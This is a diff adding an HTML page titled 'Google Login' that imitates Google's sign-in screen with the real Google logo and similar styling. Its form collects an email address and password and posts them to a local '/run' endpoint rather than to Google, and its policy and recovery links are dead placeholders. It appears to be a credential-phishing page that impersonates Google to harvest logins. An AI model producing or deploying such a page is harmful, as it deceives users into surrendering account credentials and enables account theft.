@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+    <html>
+    <head>
+      <title>Google Login</title>
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap">
+      <style>
+        body {
+          font-family: "Roboto", sans-serif;
+          background-color: #f1f1f1;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          height: 100vh;
+          margin: 0;
+        }
+
+        .login-container {
+          width: 320px;
+          padding: 40px;
+          background-color: #ffffff;
+          text-align: center;
+          box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.1);
+          border-radius: 4px;
+        }
+
+        .logo-container {
+          margin-bottom: 30px;
+        }
+
+        .logo-img {
+          width: 92px;
+          height: 30px;
+        }
+
+        .form-input {
+          width: 100%;
+          padding: 12px;
+          margin-bottom: 20px;
+          border: 1px solid #dadce0;
+          border-radius: 4px;
+          font-size: 14px;
+          background-color: #ffffff;
+          outline: none;
+        }
+
+        .submit-btn {
+          width: 100%;
+          padding: 14px;
+          border: none;
+          border-radius: 4px;
+          font-size: 14px;
+          font-weight: bold;
+          text-transform: uppercase;
+          background-color: #4285f4;
+          color: #ffffff;
+          cursor: pointer;
+          transition: background-color 0.3s;
+        }
+
+        .submit-btn:hover {
+          background-color: #3367d6;
+        }
+
+        .submit-btn:focus {
+          background-color: #1e4092;
+        }
+
+        .forgot-password {
+          text-align: left;
+          margin-bottom: 20px;
+        }
+
+        .forgot-password a {
+          color: #757575;
+          text-decoration: none;
+          font-size: 14px;
+        }
+
+        .agreement-text {
+          font-size: 12px;
+          color: #757575;
+          margin-bottom: 20px;
+        }
+
+        .agreement-text a {
+          color: #757575;
+          text-decoration: none;
+          font-weight: bold;
+        }
+
+        .google-signin {
+          display: flex;
+          justify-content: center;
+        }
+
+        .google-signin a {
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          padding: 14px;
+          border-radius: 4px;
+          background-color: #ffffff;
+          color: #757575;
+          font-size: 14px;
+          font-weight: bold;
+          text-decoration: none;
+          cursor: pointer;
+          transition: background-color 0.3s;
+          box-shadow: 0px 1px 3px rgba(0, 0, 0, 0.1);
+        }
+
+        .google-signin a:hover {
+          background-color: #f1f1f1;
+        }
+
+        .google-signin a:focus {
+          background-color: #f1f1f1;
+        }
+      </style>
+    </head>
+    <body>
+      <div class="login-container">
+        <div class="logo-container">
+          <img class="logo-img" src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_dark_clr_74x24px.svg" alt="Google Logo">
+        </div>
+        <form id="loginForm" action="/run" method="post">
+          <input class="form-input" type="email" id="email" name="email" placeholder="Email" required>
+          <input class="form-input" type="password" id="password" name="password" placeholder="Password" required>
+          <input class="submit-btn" type="submit" value="Sign in">
+        </form>
+        <div class="forgot-password">
+          <a href="#">Forgot password?</a>
+        </div>
+        <div class="agreement-text">
+          By signing in, you agree to Google's <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
+        </div>
+        <div class="google-signin">
+          <a href="#">Sign in with Google</a>
+        </div>
+      </div>
+    </body>
+    </html>
